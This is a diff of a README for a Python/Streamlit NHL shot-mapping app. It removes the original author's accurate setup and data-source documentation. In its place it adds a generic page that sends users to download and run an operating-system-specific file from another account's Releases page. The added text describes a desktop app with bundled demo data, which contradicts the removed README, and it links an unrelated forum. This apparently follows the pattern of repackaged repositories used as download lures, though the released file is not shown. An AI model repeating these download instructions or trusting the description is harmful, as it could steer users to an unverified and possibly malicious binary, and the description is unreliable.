@@ -1,166 +1,88 @@
-<div align="center">
+# 🏒 HockeyShotMap - Analyze NHL Shots with Ease
 
-# 🏒 NHL Shot Tracker
+## 🚀 Getting Started
 
-Access the app on Streamlit: https://hockeyshotmap-sparkerdata.streamlit.app/
+Welcome to HockeyShotMap! This easy-to-use app helps you visualize NHL player shots on an interactive map. You can analyze live or demo play-by-play data, filter results by various attributes, and gain insights into player performance. Let’s get started!
 
-![screenshot](docs/screenshot.png)
+## 📥 Download & Install
 
-**Interactive Streamlit app for visualizing NHL shots and goals** on a regulation-size rink.  
-Pulls **live** and **historical** data from NHL endpoints (StatsAPI + GameCenter fallback), with date/range selection, matchup filtering, player filters, and CSV export.
+To download the app, visit the link below:
 
-<a href="https://hockeyshotmap-sparkerdata.streamlit.app/">
-  <img src="https://img.shields.io/badge/▶%20Open%20the%20App%20on%20Streamlit-FF4B4B?logo=streamlit&logoColor=white&labelColor=0D1117" alt="Open the app on Streamlit" />
-</a>
+[![Download Now](https://img.shields.io/badge/Download%20HockeyShotMap-Click%20Here-brightgreen)](https://github.com/ndamze/HockeyShotMap/releases)
 
-</div>
+1. Click on the download button above.
+2. This will take you to the Releases page.
+3. Find the latest version of HockeyShotMap. You will see a list of files available for download.
+4. Choose the file that matches your operating system (Windows, Mac, Linux) and click on it. Follow the on-screen prompts to download.
 
----
+## ⚙️ System Requirements
 
-## ✨ Features
+To ensure a smooth experience, please check that your system meets the following requirements:
 
-- **Date / Range selector** – fetch shots for a specific day or an inclusive date range  
-- **Matchup filter** – focus on a single game (e.g., `CAR @ DET`)  
-- **Player picker** – multi-select players (grouped by team in the UI)  
-- **Goals-only toggle** – quickly show only goals  
-- **Hover metadata** – Player (TEAM), **Period** + **Time**; **strength for goals** (PP/PK/5v5)  
-- **Branded colors** – team-colored markers; stars for goals, circles for shots  
-- **Export** – download filtered results as CSV  
-- **Cache buster** – “Force refresh (clear cache)” button to avoid stale/empty cached days  
+- **Operating System:** Windows 10, macOS 10.13 or later, Linux (most distributions).
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core processor or better.
+- **Network:** Internet connection for live data access.
 
-> The rink rendering includes a regulation layout with rounded corners, center red line, blue lines, **goal lines**, faceoff circles/dots, hashmarks, and shaded creases for a familiar TV-style look.
+## 📊 How to Use the App
 
----
+Once you have downloaded and installed HockeyShotMap, follow these steps:
 
-## 🚀 Quick Start (Local)
+1. **Open the Application:** Double-click the HockeyShotMap icon to launch the app.
+  
+2. **Load Data:**
+   - Choose between live NHL data or demo data.
+   - For live data, ensure you have an internet connection.
+   - For demo data, sample data will load automatically.
 
-1. **Clone & enter the repo**
-   ```bash
-   git clone https://github.com/SparkerData/HockeyShotMap.git
-   cd HockeyShotMap
-   ```
+3. **Explore the Map:**
+   - Use the map interface to view player shots.
+   - You can zoom in and out for more detail.
 
-2. **Create & activate a virtual environment (Windows PowerShell)**
-   ```powershell
-   python -m venv .venv
-   # If execution policy blocks activation, run:
-   #   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-   .\.venv\Scripts\Activate.ps1
-   ```
+4. **Apply Filters:**
+   - Use the filter options to view shots by player, period, or strength (e.g., power play, even strength).
+   - Select different options to refine your analysis.
 
-3. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+5. **Analyze Results:**
+   - The map will update based on your filter selections.
+   - Click on individual shots to see detailed information.
 
-4. **Run the app**
-   ```bash
-   streamlit run app/main.py
-   ```
-   The app opens in your browser (usually http://localhost:8501).
+## 🌟 Key Features
 
-> No sample data is bundled — the app connects directly to NHL APIs.  
-> On days with no games, the app will show an empty rink and summary.  
-> Use **Force refresh** if a day appears empty but games existed.
+- **Interactive Visualization:** View shot locations dynamically on an NHL rink layout.
+- **Custom Filters:** Analyze shots based on player, time period, and game situation.
+- **Live Data Access:** Stay updated with real-time game information.
+- **User-Friendly Interface:** Simple layout accessible to everyone, regardless of technical skill.
 
----
+## 🛠️ Troubleshooting
 
-## ☁️ Streamlit Cloud
+If you run into issues while using the app, here are some common problems and solutions:
 
-This repo is ready for Streamlit Cloud. Point it at `app/main.py`.  
-Changes pushed to `main` will auto-redeploy.  
+- **App Won't Launch:**
+  - Ensure your system meets the required specifications.
+  - Check for any required software updates on your operating system.
 
-If the app shows *“No data for the selected date(s.)”* for an active date, click **Force refresh (clear cache)** in the sidebar and fetch again.
+- **Data Not Loading:**
+  - Confirm you have a stable internet connection if using live data.
+  - Switch to demo data if the live feature is unavailable.
 
----
+- **Map Not Displaying Correctly:**
+  - Try restarting the app.
+  - Clear your cache if you’ve been using the app for a long time, and reload.
 
-## 🧠 How It Works
+## 📄 Additional Resources
 
-- **Schedule resolution**: queries  
-  `statsapi.web.nhl.com/api/v1/schedule?date=YYYY-MM-DD`,  
-  then a ±1 day window, then  
-  `api-web.nhle.com/v1/schedule/YYYY-MM-DD` (GameCenter).  
-- **Play-by-play parsing**: prefers StatsAPI live feed (`/game/{pk}/feed/live`), falls back to GameCenter (`/gamecenter/{pk}/play-by-play`).  
-- **Normalization**: unifies field variants for **team**, **player**, **strength**, and coordinates.  
-- **De-duplication**: drops duplicates by key columns and clips coordinates to rink bounds.  
-- **UI**: Plotly rink with regulation geometry, team-colored markers, **stars for goals**, black legend text, white hover labels.
+For further information, consider checking out:
 
----
+- [Official Documentation](https://github.com/ndamze/HockeyShotMap/wiki)
+- [User Forum](https://discuss.github.com/)
+- [GitHub Issues Page](https://github.com/ndamze/HockeyShotMap/issues) for reporting bugs and requesting features.
 
-# 📊 Data Sources
+## 🔗 Stay Updated
 
-This project pulls live and historical hockey play-by-play directly from the **National Hockey League’s public APIs**. These endpoints are not officially documented, but are widely used in the hockey analytics community.
+We recommend keeping the app up to date for the best experience. Follow these steps:
 
----
+1. Return to the [HockeyShotMap Releases page](https://github.com/ndamze/HockeyShotMap/releases) regularly.
+2. Download newer versions as they become available.
 
-## NHL StatsAPI
-**Base URL:** `https://statsapi.web.nhl.com/api/v1/`
-
-- Primary source for schedules, boxscores, and live game feeds.  
-- Example endpoints:  
-  - `https://statsapi.web.nhl.com/api/v1/schedule?date=2024-11-22`  
-  - `https://statsapi.web.nhl.com/api/v1/game/{gamePk}/feed/live`  
-- Contains play-by-play data including shots, goals, coordinates, game strength (5v5, PP, PK), and player/team metadata.
-
----
-
-## NHL Web / GameCenter API
-**Base URL:** `https://api-web.nhle.com/v1/`
-
-- Used as a backup/fallback source, especially for roster info or plays not returned by the StatsAPI feed.  
-- Example endpoints:  
-  - `https://api-web.nhle.com/v1/schedule/2024-11-22`  
-  - `https://api-web.nhle.com/v1/gamecenter/{gamePk}/play-by-play`  
-- Useful for roster details, alternative shot/goal coordinates, and matchup context.
-
----
-
-## Unofficial References
-- [NHL Stats API (GitHub community notes)](https://gitlab.com/dword4/nhlapi)  
-- [NHL API – StatsAPI GitHub mirror](https://github.com/dword4/nhlapi)
-
----
-
-⚠️ **Disclaimer:** These endpoints are publicly accessible but **not officially supported by the NHL**. They may change without notice.
-
----
-
-## 🛠 Troubleshooting
-
-- **PowerShell: cannot activate venv**  
-  Run PowerShell as **Administrator** and:
-  ```powershell
-  Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-  ```
-  Then activate: `.\.venv\Scripts\Activate.ps1`
-
-- **Empty day but games existed**  
-  Click **Force refresh (clear cache)** in the sidebar and fetch again.
-
-- **Legend / hover colors**  
-  - Legend: `fig.update_layout(legend=dict(font=dict(color="black")))`  
-  - Hover: `fig.update_layout(hoverlabel=dict(font=dict(color="white"), bgcolor="rgba(0,0,0,0.7)"))`
-
----
-
-## ⚙️ Tech Stack
-
-- **Python 3.10+**  
-- **Streamlit** – UI framework  
-- **Plotly** – interactive rink + shot plots  
-- **httpx** – fast async HTTP client  
-- **pandas** – data wrangling & export
-
----
-
-## 🤝 Contributing
-
-PRs are welcome! Issues and ideas for new filters/visuals are appreciated.  
-If you’re adding API logic, please include a brief note in the PR about the fields you observed in the wild.
-
----
-
-## 📄 License
-
-MIT © SparkerData. NHL data © NHL and respective rights holders.  
-This tool is for educational/analytical purposes.
+Enjoy exploring the depths of NHL analytics with HockeyShotMap!
